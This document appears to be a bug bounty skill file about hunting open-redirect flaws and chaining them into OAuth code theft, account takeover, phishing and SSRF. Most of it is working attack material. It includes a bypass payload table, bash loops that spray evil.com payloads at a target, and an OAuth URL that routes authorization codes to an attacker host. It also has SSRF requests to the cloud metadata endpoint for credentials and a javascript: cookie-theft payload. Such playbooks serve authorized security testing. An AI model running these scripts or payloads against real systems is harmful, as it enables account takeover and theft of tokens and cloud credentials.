---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
sources: hackerone_public
report_count: 28
---

# HUNT-OPEN-REDIRECT — Open Redirect

## When to Use

Use when the target has any redirect parameter — ?url=, ?next=, ?redirect=, ?return=, ?redirect_uri=, or similar — on login/logout flows, OAuth authorization endpoints, language switchers, payment redirects, or any parameter that controls where the user is sent after an action. Open redirect alone is Low on most programs, but becomes Critical when chained to OAuth token theft (redirect_uri bypass) or SSRF escalation. Every OAuth authorization endpoint with a configurable redirect_uri is the highest-value target.

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

## Common Root Causes

1. **Parameter whitelist without validation** — Developers maintain a list of redirect parameters (`url`, `next`, `return`) but only validate that the parameter *exists*, not its value.
2. **User-friendly redirect features** — Post-login redirect, logout redirect, and language-switching features all need to redirect to user-controlled destinations.
3. **Third-party OAuth/SAML libraries** — Many auth libraries allow configuring `redirect_uri` validation loosely (prefix match, suffix match, wildcard) that match attacker-controlled subdomains.
4. **SSO implementation shortcuts** — Developers configure `redirect_uri` to accept the current request Host header, enabling Host-header-based open redirects.
5. **Assume-JSON-bodies-are-safe** — POST-based redirect parameters in API requests frequently skip validation that GET-based redirects enforce.
6. **Fragment and linefeed handling** — URL parsers disagree on what constitutes the end of a URL; newlines and carriage returns can break out of URL validation.

## Real Examples

**Scenario A — OAuth redirect_uri Wildcard → 1-Click ATO**
A ride-sharing platform's OAuth implementation accepted `redirect_uri` values matching `*.uberinternal.com`. An attacker found a dangling subdomain at `support.uberinternal.com` that could be claimed. By crafting an authorize URL with `redirect_uri=https://support.uberinternal.com/oauth-callback`, an attacker could intercept the auth code of any user who clicked the link, exchange it for an access token, and achieve full account takeover. Impact: Critical — complete user account takeover via a single crafted link.

**Scenario B — Logout Redirect in Password Reset Email → Session Hijack**
A major e-commerce platform's password reset email contained a logout link with a `redirect_to` parameter: `https://target.com/logout?redirect_to=https://target.com/reset-complete`. The `redirect_to` parameter accepted any URL, including `https://evil.com`. An attacker who could intercept the reset email (via email compromise or MitM) could modify the redirect target. After the victim reset their password, they were redirected to the attacker's site with the new session cookie still valid for cross-origin exfiltration. Impact: session hijack post-password-reset.

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## Related Skills

- **`hunt-oauth`** — Open redirect on an OAuth `redirect_uri` turns a Low finding into Critical ATO. Chain primitive: `redirect_uri=https://target.com/redirect?url=https://evil.com` → auth code lands on evil.com → exchange for token → ATO.
- **`hunt-ssrf`** — If the 302 redirect is followed *server-side* (image proxy, link preview), open redirect becomes SSRF. Chain primitive: server-side URL fetcher follows 302 from attacker host to `http://169.254.169.254/latest/meta-data/` → cloud creds.
- **`hunt-ato`** — Password reset links that include an open redirect in the return URL leak the token. Chain primitive: reset email contains `https://target.com/reset?token=X&redirect=https://evil.com` → token exfil via Referer or redirect.
- **`hunt-xss`** — `javascript:` protocol in redirect parameters creates a single-click XSS. Chain primitive: `?redirect=javascript:alert(document.cookie)` → session cookie theft without server-side injection.
- **`hunt-host-header`** — Open redirect via Host header injection overlaps with this class. Chain primitive: Host: evil.com → server builds redirect Location from Host → victim redirected to attacker host.
- **`security-arsenal`** — Load the Open Redirect Bypass Table: protocol-relative `//evil.com`, backslash `\\evil.com`, at-sign `@evil.com`, double-slash encoding, null byte, whitespace injection, data: URI.
- **`triage-validation`** — Apply the Pre-Severity Gate. A standalone open redirect is Low on most programs. Only file at High+ when you demonstrate a chain (OAuth token theft, session fixation, SSRF escalation).
